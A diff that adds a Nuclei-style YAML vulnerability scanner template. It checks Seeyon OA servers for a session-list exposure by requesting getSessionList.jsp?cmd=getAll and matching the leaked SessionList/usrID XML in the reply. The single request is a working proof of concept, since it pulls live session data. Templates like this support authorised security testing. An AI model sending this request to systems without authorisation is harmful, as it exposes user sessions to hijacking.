@@ -1,0 +1,26 @@
+id: poc-yaml-seeyon-session-leak
+
+info:
+  name: poc-yaml-seeyon-session-leak
+  author: sakura404x
+  severity: high
+  tags: xray-converted,exposure,ct-158518
+  reference:
+    - https://vulners.com/seebug/SSV:93312
+    - https://moshou.org.cn/index.php/archives/1690/
+
+http:
+  - raw:
+      - |
+        GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<SessionList>\r\n<Session>\r\n<usrID>"
